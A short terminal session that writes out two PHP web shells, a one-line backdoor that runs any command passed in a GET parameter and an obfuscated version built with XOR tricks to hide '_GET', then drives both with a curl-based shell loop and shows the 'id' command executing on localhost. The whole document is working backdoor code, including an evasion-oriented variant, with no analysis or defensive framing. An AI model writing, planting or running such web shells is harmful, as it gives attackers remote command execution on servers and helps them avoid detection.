$ cat backdoor.php
<?=`$_GET[0]`?>

$ cat obfuse.php
<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>

$ cat cli.sh
while true;do read -p "[>] halah@wibu:~$ " cmd;curl $1$cmd;done

$ bash cli.sh http://localhost:2018/backdoor.php?0=
[>] halah@wibu:~$ id
uid=10198(u0_a198) gid=10198(u0_a198) groups=10198(u0_a198),3003(inet),9997(everybody),20198(u0_a198_cache),50198(all_a198),99909997(u999_everybody)


$ bash cli.sh http://localhost:2018/obfuse.php?0=
[>] halah@wibu:~$ id
uid=10198(u0_a198) gid=10198(u0_a198) groups=10198(u0_a198),3003(inet),9997(everybody),20198(u0_a198_cache),50198(all_a198),99909997(u999_everybody)
